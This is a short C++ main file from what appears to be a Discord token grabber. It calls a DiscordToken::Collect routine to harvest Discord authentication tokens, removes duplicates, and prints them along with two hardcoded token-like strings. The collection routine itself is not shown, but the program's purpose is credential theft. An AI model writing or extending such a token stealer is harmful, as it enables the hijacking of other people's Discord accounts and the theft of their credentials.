#include "utils/utils.hpp"
#include "DiscordToken.hpp"

int main()
{
    std::vector<std::string> token_list;
    DiscordToken::Collect(token_list);

    utils::vector::remove_duplicates(token_list);

    printf("Tokens:\n__________________\n\n");

    std::cout << "--------------------\n";

    std::cout << "Token: " << "hbAJUGVyfcFCTuvhkjnnlkJHBhcgv.OUGbjGV.jKJBhvYGGV8UIVHBuSsbakBSAIBKfg3gkbjnJVHCHG" << " \n";

    std::cout << "\n--------------------\n\n";

    std::cout << "--------------------\n";

    std::cout << "Token: " << "jnkHBJNgvhFCYfctFCGgvhBJ.NhbGVfc.jDFGHJKGjnkmHBJNgvhghVHIHByugvFCTTXHG" << " \n";

    std::cout << "\n--------------------\n\n";

    printf("__________________\n");
}